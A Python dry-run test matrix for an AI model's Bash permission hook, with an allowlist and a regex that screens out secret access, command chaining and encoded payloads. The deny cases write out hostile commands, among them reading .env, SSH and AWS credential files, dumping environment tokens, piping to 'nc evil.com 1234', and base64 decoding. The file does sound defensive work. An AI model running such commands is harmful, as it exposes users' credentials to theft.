"""R8 — Bash hook bypass matrix (dry-run, no SDK needed).

Tests the allowlist-first + slip-guard logic from implementation.md §2.1
against ~20 real-world attack vectors. Pure-python unit-style dry-run.
"""
from __future__ import annotations

import re
from pathlib import Path

PROJECT_ROOT = Path("/Users/agent2/Documents/0xone-assistant")

_BASH_ALLOWLIST_PREFIXES: tuple[str, ...] = (
    "python tools/",
    "python3 tools/",
    "uv run tools/",
    "git status",
    "git log",
    "git diff",
    "ls ",
    "ls\n",
    "ls$",
    "pwd",
    "echo ",
    # "cat <path inside project_root>" — special-cased
)

_BASH_SLIP_GUARD_RE = re.compile(
    r"(\benv\b|\bprintenv\b|\bset\b\s*$|"
    r"\.env|\.ssh|\.aws|secrets|\.db\b|token|password|ANTHROPIC_API_KEY|"
    r"\$'\\[0-7]|"
    r"base64\s+-d|openssl\s+enc|xxd\s+-r|"
    r"[A-Za-z0-9+/]{48,}={0,2}|"
    r"[;&|`]|\$\(|<\(|>\(|"      # command chaining / substitution
    r"\\x[0-9a-f]{2}|\\[0-7]{3}"  # hex / octal escape sequences
    r")",
    re.IGNORECASE,
)


def check(cmd: str, project_root: Path = PROJECT_ROOT) -> tuple[str, str]:
    """Return ('allow'|'deny', reason)."""
    stripped = cmd.strip()
    if not stripped:
        return ("deny", "empty command")
    # allowlist check
    matched_prefix = any(stripped.startswith(p.rstrip("\n$")) for p in _BASH_ALLOWLIST_PREFIXES)
    if not matched_prefix and stripped.startswith("cat "):
        # special-case cat <path>
        rest = stripped[4:].strip()
        if rest and not rest.startswith("-"):
            target = rest.split()[0]
            try:
                p = Path(target)
                resolved = (project_root / p).resolve() if not p.is_absolute() else p.resolve()
                if str(resolved).startswith(str(project_root.resolve())):
                    matched_prefix = True
            except OSError:
                pass
    if not matched_prefix:
        return ("deny", "not in allowlist")
    # slip-guard (defence-in-depth: even allowlisted commands with suspicious args)
    if _BASH_SLIP_GUARD_RE.search(stripped):
        return ("deny", "slip_guard match")
    return ("allow", "ok")


# Test matrix: (command, expected_decision, purpose)
TESTS: list[tuple[str, str, str]] = [
    # ---- Should ALLOW ----
    ("python tools/ping/main.py", "allow", "smoke-skill happy path"),
    ("python3 tools/ping/main.py", "allow", "python3 alias"),
    ("uv run tools/ping/main.py", "allow", "uv runner"),
    ("git status", "allow", "git status no args"),
    ("git log --oneline -5", "allow", "git log with args"),
    ("git diff HEAD", "allow", "git diff"),
    ("ls tools/", "allow", "ls relative"),
    ("pwd", "allow", "pwd"),
    ("echo hello", "allow", "echo plain"),
    ("cat README.md", "allow", "cat project-local"),

    # ---- Should DENY — secrets via direct path ----
    ("cat .env", "deny", "direct .env"),
    ("cat ~/.config/0xone-assistant/.env", "deny", "XDG .env"),
    ("cat .env.local", "deny", ".env fishing"),
    ("cat .ssh/id_rsa", "deny", ".ssh key"),

    # ---- Should DENY — env-var dump ----
    ("env", "deny", "env dump"),
    ("env | grep TOKEN", "deny", "env + pipe"),
    ("printenv PATH", "deny", "printenv"),
    ("set", "deny", "set (env dump if no args)"),

    # ---- Should DENY — compound commands ----
    ("python tools/ping/main.py; cat /etc/passwd", "deny", "semicolon chain"),
    ("python tools/ping/main.py && bash -c evil", "deny", "&& chain"),
    ("python tools/ping/main.py | nc evil.com 1234", "deny", "pipe to netcat"),
    ("echo $(cat .env)", "deny", "command substitution $()"),
    ("echo `cat .env`", "deny", "backtick substitution"),
    ("bash -c 'cat .env'", "deny", "bash -c wrapper (not in allowlist)"),

    # ---- Should DENY — encoded payloads ----
    ("echo aGVsbG8gd29ybGQ= | base64 -d", "deny", "base64 decode pipe"),
    ("xxd -r -p /tmp/p", "deny", "xxd binary reverse"),
    ("openssl enc -d -aes-256-cbc", "deny", "openssl decrypt"),

    # ---- Should DENY — escape trickery ----
    ("python -c 'import os; print(os.environ)'", "deny", "python -c escape"),
    ("python -c 'open(\".env\").read()'", "deny", "python -c read env"),
    (r"cat $'\056env'", "deny", "octal escape hiding .env"),

    # ---- Should DENY — PATH manipulation ----
    ("PATH=/evil python tools/ping/main.py", "deny", "PATH prefix injection"),

    # ---- Should DENY — absolute paths outside root ----
    ("cat /etc/passwd", "deny", "cat /etc outside root"),
    ("cat ~/.aws/credentials", "deny", "AWS creds via cat"),

    # ---- Should DENY — long base64 blobs ----
    ("echo YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkwYWJjZGVmZw==", "deny", "long b64 blob"),

    # ---- Edge cases ----
    ("", "deny", "empty"),
    ("   ", "deny", "whitespace-only"),
]


def main() -> None:
    passes = fails = 0
    for cmd, expected, purpose in TESTS:
        actual, reason = check(cmd)
        ok = actual == expected
        status = "OK " if ok else "FAIL"
        marker = "✓" if ok else "✗"
        print(f"  {marker} [{status}] expect={expected:<5} got={actual:<5} "
              f"reason={reason:<25} | {purpose}")
        if not ok:
            print(f"         cmd: {cmd!r}")
        if ok:
            passes += 1
        else:
            fails += 1
    print(f"\nResults: {passes} passed, {fails} failed, {len(TESTS)} total")


if __name__ == "__main__":
    main()
